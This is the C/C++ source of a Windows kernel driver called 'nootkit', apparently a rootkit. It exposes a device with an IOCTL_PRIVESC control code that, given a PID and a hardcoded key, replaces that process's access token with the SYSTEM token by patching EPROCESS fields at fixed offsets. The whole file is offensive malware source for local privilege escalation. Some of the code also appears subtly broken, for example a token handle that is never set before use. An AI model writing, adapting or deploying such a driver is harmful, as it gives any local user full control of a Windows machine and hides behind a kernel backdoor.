//#include<wdm.h>
#include <stdarg.h>
#include <ntifs.h>
#include <windef.h>

#define ERROR "[!] nootkit: Failed: "
#define WARN "[*} nootkit: "
#define INFO "[-] nootkit: "

#define IOCTL_PRIVESC CTL_CODE(FILE_DEVICE_UNKNOWN,0x2001,METHOD_BUFFERED,FILE_WRITE_ACCESS)

#define KEY 0x12341234
#if _WIN64
#define PIDOFFSET 0x2e8
#define FLINKOFFSET 0x2f0
#define TOKENOFFSET 0x360
#define PTRLEN UINT64
#else
#define PIDOFFSET 0xB4
#define FLINKOFFSET 0xb8
#define TOKENOFFSET 0xFC
#define PTRLEN DWORD
#endif

PTRLEN gpeproc_system;

typedef struct _AUX_ACCESS_DATA {
    PPRIVILEGE_SET PrivilegesUsed;
    GENERIC_MAPPING GenericMapping;
    ACCESS_MASK AccessesToAudit;
    ACCESS_MASK MaximumAuditMask;
    ULONG Unknown[41];
} AUX_ACCESS_DATA, * PAUX_ACCESS_DATA;

PTRLEN FindProcessEPROC(int terminate_PID)
{
    PTRLEN eproc = 0;
    int   current_PID = 0;
    int   start_PID = 0;
    int   i_count = 0;
    PLIST_ENTRY plist_active_procs;

    if (terminate_PID == 0)
        return terminate_PID;
    gpeproc_system = (PTRLEN)PsGetCurrentProcess();
    eproc = (PTRLEN)gpeproc_system;
    start_PID = *((int*)(eproc + PIDOFFSET));
    current_PID = start_PID;

    while (1)
    {
        if (terminate_PID == current_PID)
            return eproc;
        else if ((i_count >= 1) && (start_PID == current_PID))
        {
            return 0;
        }
        else {
            plist_active_procs = (LIST_ENTRY*)(eproc + FLINKOFFSET);
            eproc = (PTRLEN)plist_active_procs->Flink;
            eproc = eproc - FLINKOFFSET;
            current_PID = *((int*)(eproc + PIDOFFSET));
            i_count++;
        }
    }
}

VOID IocUnload(PDRIVER_OBJECT driverObject) {
    PDEVICE_OBJECT devObj = driverObject->DeviceObject;
    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Driver\\noot");

    IoDeleteSymbolicLink(&devName);
    if (devObj) IoDeleteDevice(devObj);
}


extern "C" NTKERNELAPI
NTSTATUS
SeCreateAccessState(
    PACCESS_STATE AccessState,
    PAUX_ACCESS_DATA AuxData,
    ACCESS_MASK DesiredAccess,
    PGENERIC_MAPPING GenericMapping
);

VOID
SeDeleteAccessState(
    __in PACCESS_STATE AccessState
)

{
    PAUX_ACCESS_DATA AuxData;

    PAGED_CODE();

    AuxData = (PAUX_ACCESS_DATA)AccessState->AuxData;

    if (AccessState->PrivilegesAllocated) {
        ExFreePool((PVOID)AuxData->PrivilegesUsed);
    }

    if (AccessState->ObjectName.Buffer != NULL) {
        ExFreePool(AccessState->ObjectName.Buffer);
    }

    if (AccessState->ObjectTypeName.Buffer != NULL) {
        ExFreePool(AccessState->ObjectTypeName.Buffer);
    }

    SeReleaseSubjectContext(&AccessState->SubjectSecurityContext);

    return;
}

typedef struct _ELEVATOR {
    int pid;
    int key;
}ELEVATOR, *PELEVATOR;

typedef struct _ORIG_TOKEN {
    PTRLEN peproc;
    PTRLEN ptoken_efr;
}ORIG_TOKEN, *PORIG_TOKEN;

ORIG_TOKEN original_token = {0};

void handleError(NTSTATUS, PCSTR fmt, ...);
NTSTATUS Escalate(INT32 pid);
NTSTATUS IoctlHandler(PDEVICE_OBJECT devObj, PIRP irp);

NTSTATUS IocCreateClose(PDEVICE_OBJECT devObj, PIRP irp) {

    UNREFERENCED_PARAMETER(devObj);

    PAGED_CODE(); //verify IRQL level

    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;

    IoCompleteRequest(irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;

}

extern "C" NTSTATUS
DriverEntry(
    IN PDRIVER_OBJECT  DriverObject,
    IN PUNICODE_STRING  RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Driver\\noot");
    UNICODE_STRING dosName = RTL_CONSTANT_STRING(L"\\DosDevices\\noot");
    PDEVICE_OBJECT devObj;

    NTSTATUS res = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_BEEP, FILE_DEVICE_SECURE_OPEN, TRUE, &devObj);

    if (!NT_SUCCESS(res)) { handleError(res, "IoCreateDevice, Status code: "); return res; }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = IocCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = IocCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoctlHandler;
    DriverObject->DriverUnload = IocUnload;

    res = IoCreateSymbolicLink(&dosName, &devName);

    if (!NT_SUCCESS(res)) { handleError(res, "IoCreateSymbolicLink, Status code: "); return res; }

    return STATUS_SUCCESS;

}

NTSTATUS IoctlHandler(PDEVICE_OBJECT devObj, PIRP irp) {
    
    PIO_STACK_LOCATION irpSp;
    NTSTATUS ntStatus = STATUS_SUCCESS;
    ULONG inBufLen;
    ULONG outBufLen;
    //PMDL mdl = NULL;

    UNREFERENCED_PARAMETER(devObj);
    irpSp = IoGetCurrentIrpStackLocation(irp);
    inBufLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
    outBufLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
    PELEVATOR buf = { 0 };

    if (!inBufLen || !outBufLen) {
        ntStatus = STATUS_INVALID_PARAMETER;
        goto End;
    }

    switch (irpSp->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_PRIVESC:
        buf = (PELEVATOR)irp->AssociatedIrp.SystemBuffer;
        if (buf->key == KEY) {
            NTSTATUS res = Escalate(buf->pid);
            if (!NT_SUCCESS(res)) { handleError(res, "Escalate, Status code: "); return res; }
        }
        goto End;


    default:
        goto End;
    }

End:

    irp->IoStatus.Status = ntStatus;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return ntStatus;

}

NTSTATUS Escalate(int pid) {
    ACCESS_STATE accessState;
    PAUX_ACCESS_DATA data = {0};

    PEPROCESS pseproc = NULL;
    HANDLE hseproc = NULL;
    PEPROCESS pdeproc = NULL;

    HANDLE hstoken = NULL;
    HANDLE hntoken = NULL;
    PVOID pntoken = NULL;

    NTSTATUS res = SeCreateAccessState(&accessState, data, STANDARD_RIGHTS_ALL, (PGENERIC_MAPPING)((PCHAR)*PsProcessType + 52));
    if(!NT_SUCCESS(res))return res;

    accessState.PreviouslyGrantedAccess |= accessState.RemainingDesiredAccess;
    accessState.RemainingDesiredAccess = 0;

    res = PsLookupProcessByProcessId((HANDLE)4, &pseproc);
    if (!NT_SUCCESS(res)) {
        SeDeleteAccessState(&accessState);
        return res; 
    }

    res = ObOpenObjectByPointer(pseproc, 0, &accessState, 0, *PsProcessType, KernelMode, &hseproc);
    SeDeleteAccessState(&accessState);
    ObDereferenceObject(pseproc);

    res = ZwOpenProcessTokenEx(hseproc, STANDARD_RIGHTS_ALL, OBJ_KERNEL_HANDLE, &hstoken);
    if (!NT_SUCCESS(res)) { 
        ZwClose(hstoken);
        ZwClose(hseproc);
        return res; 
    }

    res = ObReferenceObjectByHandle(hntoken, STANDARD_RIGHTS_ALL, NULL, KernelMode, &pntoken, NULL);
    if (!NT_SUCCESS(res))return res;

    pdeproc = (PEPROCESS)FindProcessEPROC(pid);
    if (!pdeproc)return STATUS_NOT_FOUND;

    original_token.peproc = (PTRLEN)pdeproc;
    original_token.ptoken_efr = *(PTRLEN*)((PTRLEN)pdeproc + TOKENOFFSET);

    *(PTRLEN*)((PTRLEN)pdeproc + TOKENOFFSET) = (PTRLEN)pntoken;

    return STATUS_SUCCESS;
}

void handleError(NTSTATUS ntstatus, PCSTR fmt, ... ) {

    va_list args;
    va_start(args, fmt);

    vDbgPrintExWithPrefix(ERROR, DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, fmt, args);
    DbgPrint("%d\n", ntstatus);
    va_end(args);
}